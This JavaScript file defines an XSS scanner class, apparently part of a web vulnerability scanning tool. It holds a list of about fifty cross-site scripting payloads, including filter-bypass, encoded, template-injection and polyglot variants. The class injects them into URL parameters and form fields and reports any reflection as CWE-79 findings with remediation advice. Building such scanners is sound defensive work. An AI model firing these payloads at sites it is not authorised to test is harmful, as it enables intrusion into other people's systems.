import { BaseScanner } from './BaseScanner.js';

export class XSSScanner extends BaseScanner {
  constructor(config) {
    super(config);
    this.name = 'XSS Scanner';
    
    // Comprehensive XSS payloads - based on PortSwigger, OWASP, and real-world bypasses
    this.payloads = [
      // Basic payloads
      '<script>alert(1)</script>',
      '<script>alert("XSS")</script>',
      '<img src=x onerror=alert(1)>',
      '<svg onload=alert(1)>',
      '<body onload=alert(1)>',
      
      // Event handler payloads
      '<div onmouseover=alert(1)>hover</div>',
      '<input onfocus=alert(1) autofocus>',
      '<marquee onstart=alert(1)>',
      '<video><source onerror=alert(1)>',
      '<audio src=x onerror=alert(1)>',
      '<details open ontoggle=alert(1)>',
      
      // Attribute breaking
      '"><script>alert(1)</script>',
      "'><script>alert(1)</script>",
      '"><img src=x onerror=alert(1)>',
      "'-alert(1)-'",
      '"-alert(1)-"',
      
      // JavaScript context
      '</script><script>alert(1)</script>',
      "';alert(1);//",
      '";alert(1);//',
      '\\";alert(1);//',
      
      // Encoded payloads
      '%3Cscript%3Ealert(1)%3C/script%3E',
      '&lt;script&gt;alert(1)&lt;/script&gt;',
      '<scr<script>ipt>alert(1)</scr</script>ipt>',
      
      // Case bypass
      '<ScRiPt>alert(1)</sCrIpT>',
      '<IMG SRC=x ONERROR=alert(1)>',
      
      // Tag bypass
      '<img/src=x onerror=alert(1)>',
      '<svg/onload=alert(1)>',
      '<script/src="data:text/javascript,alert(1)">',
      
      // Unicode bypass
      '<script>\\u0061lert(1)</script>',
      '<script>al\\u0065rt(1)</script>',
      
      // Data URI
      '<a href="javascript:alert(1)">click</a>',
      '<iframe src="javascript:alert(1)">',
      
      // HTML5 payloads
      '<math><maction actiontype="statusline#http://evil.com" xlink:href="javascript:alert(1)">',
      '<form><button formaction="javascript:alert(1)">click',
      '<isindex action="javascript:alert(1)" type=submit value=click>',
      
      // Template injection indicators
      '{{constructor.constructor("alert(1)")()}}',
      '${alert(1)}',
      '#{alert(1)}',
      
      // DOM-based XSS probes
      'javascript:alert(1)',
      'data:text/html,<script>alert(1)</script>',
      'vbscript:alert(1)',
      
      // Filter bypass with null bytes
      '<scr\\x00ipt>alert(1)</script>',
      '<img src=x o\\x00nerror=alert(1)>',
      
      // SVG-based
      '<svg><animate onbegin=alert(1)>',
      '<svg><set onbegin=alert(1)>',
      '<svg><handler xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load">alert(1)</handler>',
      
      // AngularJS
      '{{constructor.constructor(\'alert(1)\')()}}',
      
      // Vue.js
      '{{_c.constructor(\'alert(1)\')()}}',
      
      // Polyglot payloads
      'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e'
    ];
    
    // Contexts to check
    this.contexts = ['html', 'attribute', 'javascript', 'url', 'css'];
  }
  
  async scan(data) {
    const vulnerabilities = [];
    const { urls, forms, parameters } = data;
    
    // Test URL parameters
    for (const url of urls) {
      if (this.stopped) break;
      
      const vulns = await this.testUrlParameters(url);
      vulnerabilities.push(...vulns);
    }
    
    // Test forms
    for (const form of forms) {
      if (this.stopped) break;
      
      const vulns = await this.testForm(form);
      vulnerabilities.push(...vulns);
    }
    
    return vulnerabilities;
  }
  
  async testUrlParameters(url) {
    const vulnerabilities = [];
    
    try {
      const parsedUrl = new URL(url);
      const params = parsedUrl.searchParams;
      
      for (const [key, originalValue] of params.entries()) {
        for (const payload of this.getRandomPayloads(10)) {
          if (this.stopped) break;
          
          const testUrl = new URL(url);
          testUrl.searchParams.set(key, payload);
          
          const response = await this.makeRequest(testUrl.href);
          if (!response) continue;
          
          const reflected = this.checkReflection(response.data, payload);
          if (reflected) {
            vulnerabilities.push({
              type: 'XSS',
              subType: reflected.type,
              severity: this.getSeverity(reflected.type),
              url: url,
              parameter: key,
              payload: payload,
              evidence: reflected.evidence,
              description: `Cross-Site Scripting (XSS) vulnerability found in parameter "${key}"`,
              remediation: 'Implement proper input validation and output encoding. Use Content-Security-Policy headers.',
              references: [
                'https://portswigger.net/web-security/cross-site-scripting',
                'https://owasp.org/www-community/attacks/xss/',
                'https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html'
              ],
              cvss: reflected.type === 'stored' ? 7.5 : 6.1,
              cwe: 'CWE-79'
            });
            break; // Found vulnerability for this parameter
          }
        }
      }
    } catch (error) {
      this.log(`XSS URL test error: ${error.message}`, 'debug');
    }
    
    return vulnerabilities;
  }
  
  async testForm(form) {
    const vulnerabilities = [];
    
    try {
      for (const input of form.inputs) {
        if (!input.name || this.stopped) continue;
        
        for (const payload of this.getRandomPayloads(5)) {
          const formData = {};
          form.inputs.forEach(inp => {
            formData[inp.name] = inp.name === input.name ? payload : inp.value || 'test';
          });
          
          const response = await this.makeRequest(form.action, {
            method: form.method,
            data: form.method === 'POST' ? formData : undefined,
            params: form.method === 'GET' ? formData : undefined
          });
          
          if (!response) continue;
          
          const reflected = this.checkReflection(response.data, payload);
          if (reflected) {
            vulnerabilities.push({
              type: 'XSS',
              subType: reflected.type,
              severity: this.getSeverity(reflected.type),
              url: form.action,
              method: form.method,
              parameter: input.name,
              payload: payload,
              evidence: reflected.evidence,
              description: `Cross-Site Scripting (XSS) vulnerability found in form field "${input.name}"`,
              remediation: 'Implement proper input validation and output encoding. Use Content-Security-Policy headers.',
              references: [
                'https://portswigger.net/web-security/cross-site-scripting',
                'https://owasp.org/www-community/attacks/xss/'
              ],
              cvss: reflected.type === 'stored' ? 7.5 : 6.1,
              cwe: 'CWE-79'
            });
            break;
          }
        }
      }
    } catch (error) {
      this.log(`XSS form test error: ${error.message}`, 'debug');
    }
    
    return vulnerabilities;
  }
  
  checkReflection(html, payload) {
    if (!html || typeof html !== 'string') return null;
    
    // Check for direct reflection
    if (html.includes(payload)) {
      return {
        type: 'reflected',
        evidence: this.extractEvidence(html, payload)
      };
    }
    
    // Check for decoded/encoded reflection
    const decodedPayload = decodeURIComponent(payload);
    if (html.includes(decodedPayload)) {
      return {
        type: 'reflected',
        evidence: this.extractEvidence(html, decodedPayload)
      };
    }
    
    // Check for partial reflection (indicating potential for XSS)
    const scriptIndicators = ['<script', 'onerror=', 'onload=', 'onclick=', 'javascript:'];
    for (const indicator of scriptIndicators) {
      if (payload.toLowerCase().includes(indicator) && 
          html.toLowerCase().includes(indicator)) {
        return {
          type: 'potential',
          evidence: this.extractEvidence(html, indicator)
        };
      }
    }
    
    return null;
  }
  
  extractEvidence(html, search) {
    const index = html.indexOf(search);
    if (index === -1) return search;
    
    const start = Math.max(0, index - 50);
    const end = Math.min(html.length, index + search.length + 50);
    return '...' + html.substring(start, end) + '...';
  }
  
  getSeverity(type) {
    switch (type) {
      case 'stored': return 'high';
      case 'reflected': return 'medium';
      case 'dom': return 'medium';
      case 'potential': return 'low';
      default: return 'info';
    }
  }
  
  getRandomPayloads(count) {
    const shuffled = [...this.payloads].sort(() => Math.random() - 0.5);
    return shuffled.slice(0, count);
  }
}
